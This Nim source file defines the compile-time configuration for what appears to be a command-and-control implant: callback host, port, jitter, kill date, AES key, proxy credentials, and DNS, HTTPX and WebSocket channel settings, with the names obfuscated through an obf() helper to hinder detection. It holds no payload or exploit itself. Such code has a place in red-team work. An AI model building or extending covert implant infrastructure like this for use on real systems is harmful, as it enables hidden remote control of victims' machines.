import std/[strutils, os]
import utils/strenc

type
  Config* = object
    uuid*: string
    profile*: string
    callbackHost*: string
    callbackPort*: string
    postUri*: string
    userAgent*: string
    headers*: string
    proxyHost*: string
    proxyPort*: string
    proxyUser*: string
    proxyPass*: string
    aesKey*: string
    encryptedExchange*: bool
    callbackInterval*: int
    callbackJitter*: int
    killdate*: string
    # DNS-specific fields
    dnsServer*: string
    domains*: string
    recordType*: string
    domainRotation*: string
    maxQueryLength*: int
    maxSubdomainLength*: int
    failoverThreshold*: int
    # HTTPX-specific fields
    callbackDomains*: string
    rawC2Config*: string
    # WebSocket-specific fields
    endpointReplace*: string

proc getConfig*(): Config =
  ## Get configuration from compile-time environment variables
  result.uuid = static: getEnv(obf("UUID"), "")
  result.profile = static: getEnv(obf("PROFILE"), "")
  result.callbackHost = static: getEnv(obf("CALLBACK_HOST"), "")
  
  # TCP uses PORT, HTTP uses CALLBACK_PORT
  let port = static: getEnv(obf("PORT"), "")
  let callbackPort = static: getEnv(obf("CALLBACK_PORT"), "")
  result.callbackPort = if callbackPort.len > 0: callbackPort elif port.len > 0: port else: ""
  
  result.postUri = static: getEnv(obf("POST_URI"), "")
  result.userAgent = static: getEnv(obf("USER_AGENT"), "")
  result.headers = static: getEnv(obf("HEADERS"), "")
  result.proxyHost = static: getEnv(obf("PROXY_HOST"), "")
  result.proxyPort = static: getEnv(obf("PROXY_PORT"), "")
  result.proxyUser = static: getEnv(obf("PROXY_USER"), "")
  result.proxyPass = static: getEnv(obf("PROXY_PASS"), "")
  result.aesKey = static: getEnv(obf("AESPSK"), "")
  
  let eec = static: getEnv(obf("ENCRYPTED_EXCHANGE_CHECK"), "")
  result.encryptedExchange = eec.toLowerAscii in ["true", "t"]
  
  # Default to 10 and 23 if not provided (TCP doesn't use these)
  result.callbackInterval = static: parseInt(getEnv(obf("CALLBACK_INTERVAL"), "10"))
  result.callbackJitter = static: parseInt(getEnv(obf("CALLBACK_JITTER"), "23"))
  result.killdate = static: getEnv(obf("KILLDATE"), "")
  
  # DNS-specific configuration (empty if not DNS profile)
  result.dnsServer = static: getEnv(obf("DNS_SERVER"), "")
  result.domains = static: getEnv(obf("DOMAINS"), "")
  result.recordType = static: getEnv(obf("RECORD_TYPE"), "")
  result.domainRotation = static: getEnv(obf("DOMAIN_ROTATION"), "")
  result.maxQueryLength = static: parseInt(getEnv(obf("MAX_QUERY_LENGTH"), "0"))
  result.maxSubdomainLength = static: parseInt(getEnv(obf("MAX_SUBDOMAIN_LENGTH"), "0"))
  result.failoverThreshold = static: parseInt(getEnv(obf("FAILOVER_THRESHOLD"), "0"))
  
  # HTTPX-specific configuration (empty if not httpx profile)
  result.callbackDomains = static: getEnv(obf("CALLBACK_DOMAINS"), "")
  result.rawC2Config = static: getEnv(obf("RAW_C2_CONFIG"), "")
  
  # WebSocket-specific configuration (empty if not websocket profile)
  result.endpointReplace = static: getEnv(obf("ENDPOINT_REPLACE"), "")
  